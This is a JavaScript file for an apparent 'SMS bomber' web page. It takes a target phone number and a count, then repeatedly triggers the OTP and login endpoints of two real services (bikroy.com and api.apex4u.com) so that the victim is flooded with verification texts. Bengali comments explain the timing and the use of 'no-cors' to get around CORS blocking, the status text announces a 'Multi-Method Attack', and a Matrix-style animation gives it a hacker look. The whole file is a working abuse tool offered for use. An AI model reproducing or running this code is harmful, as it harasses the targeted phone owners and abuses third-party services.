let isCooldown = false; 

window.onload = function() {
    const savedCooldownTime = localStorage.getItem('cooldownEndTime');
    if (savedCooldownTime) {
        const currentTime = Date.now();
        if (currentTime < savedCooldownTime) {
            const remainingTime = Math.ceil((savedCooldownTime - currentTime) / 1000);
            activateCooldown(remainingTime);
        }
    }
};

async function startProcess() {
    const target = document.getElementById('target').value;
    const countInput = document.getElementById('count');
    const count = parseInt(countInput.value);
    const display = document.getElementById('display');

    if (isCooldown) {
        display.innerText = "Wait for cooldown!";
        return;
    }

    if(!target || !count) { 
        display.innerText = "Enter number & amount!";
        return; 
    }

    display.innerText = "Multi-Method Attack Started...";
    
    for (let i = 1; i <= count; i++) {
        try { 
            // লজিক: ১ নম্বরে GET (Bikroy), ২ নম্বরে POST (Apex)
            if (i % 2 !== 0) {
                // ১. Bikroy (GET Method)
                // CORS ব্লকের কারণে এটি ফেইল হতে পারে, তবে আমরা চেষ্টা করছি
                await fetch(`https://bikroy.com/data/phone_number_verification/otp?phone=${target}`, {
                    method: 'GET',
                    mode: 'no-cors' // CORS ব্লক এড়াতে 'no-cors' মোড ব্যবহার
                });
            } else {
                // ২. Apex (POST Method)
                await fetch('https://api.apex4u.com/api/auth/login', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ "phoneNumber": target }),
                    mode: 'cors'
                });
            }

            display.innerText = "Sent Request: " + i;
            
            // এসএমএস কম যাওয়ার সমস্যা সমাধানের জন্য বিরতি বাড়ানো হয়েছে
            // ৫ সেকেন্ড অপেক্ষা করবে প্রতিটি রিকোয়েস্টের মাঝে
            await new Promise(res => setTimeout(res, 5000)); 
            
        } catch (e) {
            console.log("Request " + i + " failed but moving on...");
        }
    }

    const cooldownEndTime = Date.now() + 60000;
    localStorage.setItem('cooldownEndTime', cooldownEndTime);
    activateCooldown(60);
}

function activateCooldown(seconds) {
    isCooldown = true;
    let timeLeft = seconds;
    const timer = setInterval(() => {
        timeLeft--;
        document.getElementById('display').innerText = `Wait: ${timeLeft}s`;
        if (timeLeft <= 0) {
            clearInterval(timer);
            isCooldown = false;
            localStorage.removeItem('cooldownEndTime');
            document.getElementById('display').innerText = "Ready!";
        }
    }, 1000);
}

// Matrix Animation (অপরিবর্তিত)
const canvas = document.getElementById('matrix');
const ctx = canvas.getContext('2d');
canvas.width = window.innerWidth;
canvas.height = window.innerHeight;
const letters = "0123456789ABCDEF";
const fontSize = 16;
const columns = canvas.width / fontSize;
const drops = Array(Math.floor(columns)).fill(1);

function draw() {
    ctx.fillStyle = "rgba(0, 0, 0, 0.05)";
    ctx.fillRect(0, 0, canvas.width, canvas.height);
    ctx.fillStyle = "#00ff00";
    ctx.font = fontSize + "px monospace";
    for (let i = 0; i < drops.length; i++) {
        const text = letters[Math.floor(Math.random() * letters.length)];
        ctx.fillText(text, i * fontSize, drops[i] * fontSize);
        if (drops[i] * fontSize > canvas.height && Math.random() > 0.975) drops[i] = 0;
        drops[i]++;
    }
}
setInterval(draw, 33);
